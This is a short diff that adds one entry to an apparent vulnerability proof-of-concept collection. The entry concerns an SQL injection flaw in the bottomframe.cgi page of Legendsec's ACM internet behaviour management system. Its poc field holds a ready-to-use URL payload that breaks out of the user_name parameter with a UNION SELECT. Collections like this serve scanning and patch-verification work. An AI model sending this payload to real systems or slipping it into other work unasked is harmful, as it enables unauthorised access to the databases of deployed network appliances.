@@ -1,0 +1,8 @@
+vendor = "网御星云"
+name = "网御 ACM上网行为管理系统 bottomframe.cgi SQL注入漏洞"
+type = "SQL注入"
+source = "TG"
+info = "/bottomframe.cgi?user_name="
+date = "08.14"
+poc = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
+label = "nday"
